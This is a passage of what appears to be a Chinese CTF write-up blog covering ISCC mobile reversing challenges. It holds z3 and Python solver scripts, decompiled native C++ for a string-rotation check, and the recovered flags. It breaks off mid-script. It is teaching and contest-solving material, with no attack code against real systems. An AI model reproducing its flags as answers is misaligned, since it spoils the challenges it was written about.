int64x8_6_ == <span class="number">0x5CC80CE4D</span>   )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s.check() == sat):</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line"></span><br><span class="line">s = [<span class="number">1230193475</span>, <span class="number">2067875158</span>, <span class="number">1129599313</span>, <span class="number">1227706190</span>, <span class="number">1447708749</span>, <span class="number">1229073737</span>, <span class="number">1464097358</span>, <span class="number">1413631869</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">t=[]</span><br><span class="line">    <span class="keyword">while</span>(i&gt;<span class="number">0</span>):</span><br><span class="line">        t.append(<span class="built_in">chr</span>(i%<span class="number">256</span>))</span><br><span class="line">        i = i // <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(t[ind], end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="mobileA"><a href="#mobileA" class="headerlink" title="mobileA"></a>mobileA</h1><p>flag分为两部分，一部分去验证AES，密钥、偏移和加密后的值都有，直接用工具解就好，解出来是<code>sadasfsdASDWFSASAFfasf_</code>。</p><p>第二部分先算MD5值，然后进行base64加密，接着通过一段算法去重排base64序列来检验，比较简单，逆出来得到md5值，然后找个在线工具解出来是<code>cat</code>。</p><p>ISCC{sadasfsdASDWFSASAFfasf_cat}</p><p><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p><a href="https://cryptii.com/pipes/base64-to-hex">https://cryptii.com/pipes/base64-to-hex</a></p><h1 id="mobileB"><a href="#mobileB" class="headerlink" title="mobileB"></a>mobileB</h1><p>做完之后发现整体的加密逻辑还是比较简单的，但是做的时候就非常烧脑（做题太少，经验不够）。因为在核心的native函数中，反编译得到的代码并不是非常直观。主要的难点是符号很多，而且多次出现多个符号其实对应着同一个变量的情况。再加上涉及到自定义结构体的指针操作，给静态分析带来了较大的麻烦。</p><p>面对这样的问题，有两个要点。</p><ol><li>首先是不能半途而废，要抽丝剥茧，坚持不懈。（虽然有点儿喊口号之嫌，但确实是经验之谈）</li><li>其次是动静结合。如果实在看不出来某个变量的含义，可以动态分析去看它的值，然后猜测它的含义。如果实在看不出来某段代码的作用，比如行数较多的while和for循环体，可以先确定这段代码操作的主要数据对象，然后动态调试看看这段代码对数据对象产生了怎样的影响，进而推测这段代码的作用。</li></ol><h3 id="整体逻辑"><a href="#整体逻辑" class="headerlink" title="整体逻辑"></a>整体逻辑</h3><p>应用的加密分布在java和native两层中，可以描述成<code>JavaHash(JNIEncode(flag))=Hash</code>。Native层非常直接，经过检查并没有动态注册、init_array之类的操作，<code>stringFromJNI()</code>函数就是静态注册的。flag先被传进native计算，返回的字符串交给java函数计算hash值，然后判断是否与目标值相同。</p><h3 id="Java层"><a href="#Java层" class="headerlink" title="Java层"></a>Java层</h3><p>flag先Java层的加密函数看起来是个hash函数。对于从native返回得到的字符串，把其中的每个字符传进sum()函数计算一个数字，然后把所有数字转成字符串，加上’0’拼接起来，得到类似于<code>&quot;52405201052052301230540405120140305240&quot;</code>这样的hash值。</p><p>虽然sum()函数的递归逻辑相对烧脑，但是，如下面的函数截图所示，整个函数的缺陷是它的输入（即sum(0, chr, 0)）是有限的，或者说native返回的是个字符串，这也导致这个hash函数的输入是有限的。</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220506233246.png" alt="image-20220506233246595" style="zoom:67%;" /><p>因此，遍历sum(0, chr, 0)的所有可能，得到映射表，然后递归求解native返回的字符串的具体值。</p><p>简单写个py代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;51234&quot;</span>:<span class="string">&quot;127&quot;</span>, <span class="string">&quot;1234&quot;</span>:<span class="string">&quot;126&quot;</span>, <span class="string">&quot;5234&quot;</span>:<span class="string">&quot;125&quot;</span>, <span class="string">&quot;234&quot;</span>:<span class="string">&quot;124&quot;</span>, <span class="string">&quot;5134&quot;</span>:<span class="string">&quot;123&quot;</span>, <span class="string">&quot;134&quot;</span>:<span class="string">&quot;122&quot;</span>, <span class="string">&quot;534&quot;</span>:<span class="string">&quot;121&quot;</span>, <span class="string">&quot;34&quot;</span>:<span class="string">&quot;120&quot;</span>, <span class="string">&quot;5124&quot;</span>:<span class="string">&quot;119&quot;</span>, <span class="string">&quot;124&quot;</span>:<span class="string">&quot;118&quot;</span>, <span class="string">&quot;524&quot;</span>:<span class="string">&quot;117&quot;</span>, <span class="string">&quot;24&quot;</span>:<span class="string">&quot;116&quot;</span>, <span class="string">&quot;514&quot;</span>:<span class="string">&quot;115&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;114&quot;</span>, <span class="string">&quot;54&quot;</span>:<span class="string">&quot;113&quot;</span>, <span class="string">&quot;4&quot;</span>:<span class="string">&quot;112&quot;</span>, <span class="string">&quot;5123&quot;</span>:<span class="string">&quot;111&quot;</span>, <span class="string">&quot;123&quot;</span>:<span class="string">&quot;110&quot;</span>, <span class="string">&quot;523&quot;</span>:<span class="string">&quot;109&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;108&quot;</span>, <span class="string">&quot;513&quot;</span>:<span class="string">&quot;107&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;106&quot;</span>, <span class="string">&quot;53&quot;</span>:<span class="string">&quot;105&quot;</span>, <span class="string">&quot;3&quot;</span>:<span class="string">&quot;104&quot;</span>, <span class="string">&quot;512&quot;</span>:<span class="string">&quot;103&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;102&quot;</span>, <span class="string">&quot;52&quot;</span>:<span class="string">&quot;101&quot;</span>, <span class="string">&quot;2&quot;</span>:<span class="string">&quot;100&quot;</span>, <span class="string">&quot;51&quot;</span>:<span class="string">&quot;99&quot;</span>, <span class="string">&quot;1&quot;</span>:<span class="string">&quot;98&quot;</span>, <span class="string">&quot;5&quot;</span>:<span class="string">&quot;97&quot;</span>&#125;</span><br><span class="line">aim = <span class="string">&quot;52405201052052301230540405120140305240&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">pos, path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(pos, path)</span></span><br><span class="line">    <span class="keyword">if</span>(pos &gt;= <span class="built_in">len</span>(aim)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span> , path)</span><br><span class="line">        ret = path.upper()</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pos+<span class="number">1</span>, <span class="built_in">len</span>(aim) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(aim[pos:i] <span class="keyword">in</span> d <span class="keyword">and</span> aim[i]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">            dfs(i+<span class="number">1</span>, path + <span class="built_in">chr</span>(<span class="built_in">int</span>(d[ aim[pos:i] ])) )</span><br><span class="line">        </span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># path: UEBEMNQPGRHU</span></span><br></pre></td></tr></table></figure><h3 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h3><h4 id="1-在内存空间中排布字符串"><a href="#1-在内存空间中排布字符串" class="headerlink" title="1 在内存空间中排布字符串"></a>1 在内存空间中排布字符串</h4><p>一瞬定位到关键函数myjni()。这里出题人应该是修改了basic_string()函数（感觉是，也可能是我不熟知的STL什么的），该函数接收一个字符串，并在目标地址处开辟3个int32。若设字符串长度为Len，则第一个int32为((Len+16)&amp;0xFFFFFFF0)+1，第二个int32存储Len，另外开辟一块空间存放字符串，把地址存放在第三个int32中。</p><p>这样一来，预设的12个字符串就对应着3x12个int32。再按照<code>[3, 12, 6, 8, 7, 2, 4, 11, 1, 5, 9, 10]</code>变换顺序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;flag1, flag);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)struct_3int, <span class="string">&quot;FIXBMTURVPYJGZOQNKASEWCHLD&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">12</span>], <span class="string">&quot;UVBXSAFJDGHICZOPQRWELKTMNY&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">24</span>], <span class="string">&quot;PZGNVYDEFIJCBKARLUQHMWXOST&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">36</span>], <span class="string">&quot;FBSPMACKDRQITWHZLJXYGENOUV&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">48</span>], <span class="string">&quot;DTINKLUJCOMEQRAPGSXYFZBHVW&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">60</span>], <span class="string">&quot;XAMTFIRBVHEJSCDYZPKLNQGUOW&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">72</span>], <span class="string">&quot;EVRYXJACTZGHWOPQSIBUMNDFLK&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">84</span>], <span class="string">&quot;VWQGHLZBJEUYFPCSTNIKAXMORD&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">96</span>], <span class="string">&quot;FJNVWSTDXYUKMBCZLIGOPEHAQR&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">108</span>], <span class="string">&quot;NSKBRTUZEJOPGIFXCDAVWQYLMH&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">120</span>], <span class="string">&quot;ASTKPZJDCLYMVHXBNWIUOQGREF&quot;</span>);</span><br><span class="line">std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)&amp;struct_3int[<span class="number">132</span>], <span class="string">&quot;LZWXEHIMFUOPKJGAYTNCBDRSQV&quot;</span>);</span><br><span class="line">temp_add3 = (<span class="keyword">int</span> *)temp;</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(temp));</span><br><span class="line"><span class="keyword">for</span> ( ind1 = <span class="number">0</span>; ind1 != <span class="number">12</span>; ++ind1 )</span><br><span class="line">&#123;</span><br><span class="line">    crt_ptr = (<span class="keyword">int</span> *)&amp;struct_3int[<span class="number">12</span> * adv[ind1] - <span class="number">12</span>];<span class="comment">// adv = [3, 12, 6, 8, 7, 2, 4, 11, 1, 5, 9, 10]</span></span><br><span class="line">    <span class="keyword">if</span> ( temp_add3 != crt_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">        crt_str_ptr = (<span class="keyword">char</span> *)crt_ptr[<span class="number">2</span>];</span><br><span class="line">        crt_str_realLen = crt_ptr[<span class="number">1</span>];</span><br><span class="line">        crt_str_fLens = *(<span class="keyword">unsigned</span> __int8 *)crt_ptr;</span><br><span class="line">        <span class="keyword">if</span> ( (crt_str_fLens &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            crt_str_ptr = (<span class="keyword">char</span> *)crt_ptr + <span class="number">1</span>;</span><br><span class="line">            crt_str_realLen = crt_str_fLens &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::string::<span class="built_in">assign</span>((<span class="keyword">int</span>)temp_add3, (<span class="keyword">int</span>)crt_str_ptr, crt_str_realLen, (<span class="keyword">int</span>)crt_ptr + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    temp_add3 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-根据Flag左移字符串并取出aim数组"><a href="#2-根据Flag左移字符串并取出aim数组" class="headerlink" title="2 根据Flag左移字符串并取出aim数组"></a>2 根据Flag左移字符串并取出aim数组</h4><p>Flag为12个大写字母，枚举这12个字母，在对应序号的字符串中找到这个字母第一次出现的位置（对应的函数是memchr()），然后循环左移这个字符串，使得这个字母排在第一个，然后又去取出字符串此时下标为9的字母，用于组成aim字符串数组。</p><p>这里面的逻辑比较烧脑，原因就是前面提及的频繁出现多个符号对应同一个变量情况，以及指针操作。解决办法就是耐心分析+动静结合。遇到逻辑比较复杂的代码块理起来比较麻烦，就动态调试打上断点，去看这段代码对内存中的变量进行的怎么样的修改，大概就能猜出逻辑。对于v*这样的变量，一时看不出来含义，也可以动态调试去看运行时的值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (flag1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    flag_p4_1 = flag1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( flag_p4_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = !(flag1 &amp; <span class="number">1</span>);</span><br><span class="line">    indb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      inda = indb;</span><br><span class="line">      flag3 = flag2;</span><br><span class="line">      v17 = v12 &lt;&lt; <span class="number">31</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        flag3 = flag_p1;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(flag3[inda] - <span class="number">65</span>) &gt; <span class="number">0x19</span>u )<span class="comment">// 检查是不是A-Z</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        flag_p4_2 = flag1_1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( flag_p4_2 &gt;= <span class="number">0xD</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      temp_inda3_ptr = &amp;temp[<span class="number">3</span> * inda];</span><br><span class="line">      std::string::<span class="built_in">basic_string</span>((<span class="keyword">int</span>)&amp;tmpStructPtr, (<span class="keyword">int</span>)temp_inda3_ptr);</span><br><span class="line">      flag4 = flag2;</span><br><span class="line">      temp_inda3_ptr1 = *(<span class="keyword">unsigned</span> __int8 *)temp_inda3_ptr;</span><br><span class="line">      <span class="keyword">if</span> ( !(flag1 &lt;&lt; <span class="number">31</span>) )</span><br><span class="line">        flag4 = flag_p1;</span><br><span class="line">      flag_i_chr = (<span class="keyword">unsigned</span> __int8)flag4[inda];</span><br><span class="line">      <span class="keyword">if</span> ( temp_inda3_ptr1 &lt;&lt; <span class="number">31</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        str_i_realLen = *(_QWORD *)(temp_inda3_ptr + <span class="number">1</span>);<span class="comment">// 单位是8个byte</span></span><br><span class="line">        str_i_ptr = temp_inda3_ptr[<span class="number">2</span>];</span><br><span class="line">        str_i_realLen1 = str_i_realLen;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str_i_realLen1 = temp_inda3_ptr1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        str_i_ptr = (<span class="keyword">char</span> *)temp_inda3_ptr + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( str_i_realLen1 )</span><br><span class="line">      &#123;</span><br><span class="line">        fstOcurPtr = <span class="built_in">memchr</span>(str_i_ptr, flag_i_chr, str_i_realLen1);<span class="comment">// 定位str_i_ptr中flag_i_chr第一次出现的位置，并返回从该位置开始的字符子串的指针，没有就返回Null</span></span><br><span class="line">        <span class="keyword">if</span> ( fstOcurPtr )</span><br><span class="line">        &#123;</span><br><span class="line">          lostLen = fstOcurPtr - (_BYTE *)str_i_ptr;</span><br><span class="line">          <span class="keyword">if</span> ( fstOcurPtr - (_BYTE *)str_i_ptr &gt;= <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            indcInLostLen = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              str_i_chr_i_index0 = str_i_ptr2;</span><br><span class="line">              str_i_realLen2 = <span class="built_in">HIDWORD</span>(tmpStructPtr);<span class="comment">// 取这个8byte数据的最高4byte，实际取出了realLen</span></span><br><span class="line">              str_i_ptr4 = (<span class="keyword">char</span> *)str_i_ptr2;</span><br><span class="line">              str_i_fLen1_And1 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>;<span class="comment">// 取这个8byte数据的最低1byte，实际取出了fLen，然后AND 1，似乎是判断str类型</span></span><br><span class="line">              <span class="keyword">if</span> ( !str_i_fLen1_And1 )</span><br><span class="line">              &#123;</span><br><span class="line">                str_i_realLen2 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                str_i_ptr4 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              str_i_chr_i = *str_i_ptr4;        <span class="comment">// 用来记录头一个chr，然后再208行补到最后，完成字符串左移</span></span><br><span class="line">              <span class="keyword">if</span> ( str_i_realLen2 )</span><br><span class="line">              &#123;</span><br><span class="line">                str_i_index1_ptr = (<span class="keyword">char</span> *)str_i_ptr2 + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> ( !str_i_fLen1_And1 )</span><br><span class="line">                  str_i_index1_ptr = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">2</span>;</span><br><span class="line">                str_i_chr_i_index1 = *str_i_index1_ptr;</span><br><span class="line">                <span class="keyword">if</span> ( !str_i_fLen1_And1 )</span><br><span class="line">                  str_i_chr_i_index0 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">                *str_i_chr_i_index0 = str_i_chr_i_index1;<span class="comment">// str_i[0] = str_i[1]</span></span><br><span class="line">                str_i_realLen4 = <span class="built_in">HIDWORD</span>(tmpStructPtr);</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                  str_i_realLen4 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                v36 = !(<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> ( str_i_realLen4 &gt;= <span class="number">2</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  inde = <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">do</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    str_i_ptr1 = (<span class="keyword">char</span> *)str_i_ptr2;</span><br><span class="line">                    v39 = v36;</span><br><span class="line">                    str_i_next_chr = (<span class="keyword">char</span> *)str_i_ptr2 + inde + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( v39 )</span><br><span class="line">                      str_i_next_chr = (<span class="keyword">char</span> *)&amp;tmpStructPtr + inde + <span class="number">2</span>;</span><br><span class="line">                    temp_chr = *str_i_next_chr;</span><br><span class="line">                    <span class="keyword">if</span> ( v39 )</span><br><span class="line">                      str_i_ptr1 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">                    str_i_ptr1[inde++] = temp_chr;</span><br><span class="line">                    str_i_realLen4 = <span class="built_in">HIDWORD</span>(tmpStructPtr);</span><br><span class="line">                    <span class="keyword">if</span> ( (<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">                      str_i_realLen4 = <span class="built_in">LOBYTE</span>(tmpStructPtr) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                    v36 = !(<span class="built_in">LOBYTE</span>(tmpStructPtr) &amp; <span class="number">1</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">while</span> ( inde &lt; str_i_realLen4 );<span class="comment">// 这个while循环在把str_i循环左移一个byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                str_i_ptr4 = (<span class="keyword">char</span> *)str_i_ptr2;</span><br><span class="line">                <span class="keyword">if</span> ( v36 )</span><br><span class="line">                  str_i_ptr4 = (<span class="keyword">char</span> *)&amp;tmpStructPtr + <span class="number">1</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                str_i_realLen4 = <span class="number">0</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              ++indcInLostLen;</span><br><span class="line">              str_i_ptr4[str_i_realLen4 - <span class="number">1</span>] = str_i_chr_i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( indcInLostLen != lostLen );</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      str_i_fLen2 = <span class="built_in">LOBYTE</span>(tmpStructPtr);</span><br><span class="line">      str_i_ptr5 = str_i_ptr2;</span><br><span class="line">      tmpStructPtr = <span class="number">0.0</span>;                       <span class="comment">// 重置tmpStructPtr ?</span></span><br><span class="line">      str_i_ptr2 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( str_i_fLen2 &lt;&lt; <span class="number">31</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;aim + inda) = str_i_ptr5[<span class="number">9</span>];</span><br><span class="line">        <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(str_i_ptr5)</span></span>;            <span class="comment">// 立即清空经过循环左移之后的字符串</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">LOBYTE</span>(tmpStructPtr) &lt;&lt; <span class="number">31</span> )</span><br><span class="line">          <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(str_i_ptr2)</span></span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;aim + inda) = <span class="built_in">BYTE2</span>(str_i_ptr5);</span><br><span class="line">      &#125;</span><br><span class="line">      flag_p4_2 = flag_p4;</span><br><span class="line">      indb = inda + <span class="number">1</span>;</span><br><span class="line">      flag1_1 = flag1;</span><br><span class="line">      v14 = flag_p4;</span><br><span class="line">      v12 = !(flag1 &amp; <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (flag1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        v14 = flag1 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( indb &gt;= v14 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_58;</span><br><span class="line">    &#125;</span><br><span class="line">    std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)c, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    inda = <span class="number">0</span>;</span><br><span class="line">LABEL_58:</span><br><span class="line">    *(&amp;aim + inda + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    std::string::basic_string&lt;<span class="keyword">decltype</span>(<span class="literal">nullptr</span>)&gt;((<span class="keyword">int</span>)c, &amp;aim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="3-解密代码"><a href="#3-解密代码" class="headerlink" title="3 解密代码"></a>3 解密代码</h4><p>ISCC上面的apk会在一定的时间后被替换，把关键的数据抠出来，可以写个flag脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 